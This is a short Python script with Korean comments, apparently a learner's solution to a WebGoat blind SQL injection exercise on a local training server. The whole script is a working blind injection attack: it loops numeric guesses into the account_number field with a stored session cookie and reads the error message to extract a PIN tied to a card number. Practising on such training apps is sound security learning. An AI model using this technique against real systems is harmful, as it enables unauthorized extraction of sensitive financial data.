from requests import post # 값 전달과 읽기를 위한 requests 모듈 불러오기

uri = 'http://127.0.0.1:8080/WebGoat/attack?Screen=586116895&menu=1100' # 값을 전달할 대상
payload = "101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444') > {});" # 이거는 무슨 DB 문법인지 모르겠으나 많이 엄격해보임 (찾아봤더니 하이퍼sql)
params = {'account_number':'', 'SUBMIT':'Go!'} # POST로 전달할 때 전달하는 값 (name, value) 형식에 딕셔너리형으로 넣어 줬음
session = {'JSESSIONID':'ADD1A83FBD4479857023514A6A496B5A'} # 로그인을 유지하려면 세션이 있어야 하기 때문에 쿠키 값 저장
	
for x in range(0, 5000) : # 5000이상 조건을 넣어 봤는데 에러가 나와서 적어도 5000보다 작기 때문에 0 ~ 5000까지 반복
	params['account_number'] = payload.format(x) # params에 있는 account_number에 payload {}에 x값을 넣은 값을 넣어준다.
	# 이런식으로 account_number=payload
	# f12를 눌러 태그를 보면 account_number로 받아서 쿼리에 넣어주고 있기 때문이다

	r = post(uri, data=params, cookies=session).text # post 형식으로 전송하고 읽어오기

	if(r.find('Invalid account number.') != -1) : # 페이지내에 Invalid account number가 없으면 -1을 반환하는데 따라서 값 있을때 조건
		print('find : ' + str(x)) 
		break # 입력한 값이 정답이면 -1을 반환하지 않으니까 break
	
	else:
		print('no : ' + str(x)) # 오류 메시지가 없을 경우 그 떄의 fleg 출력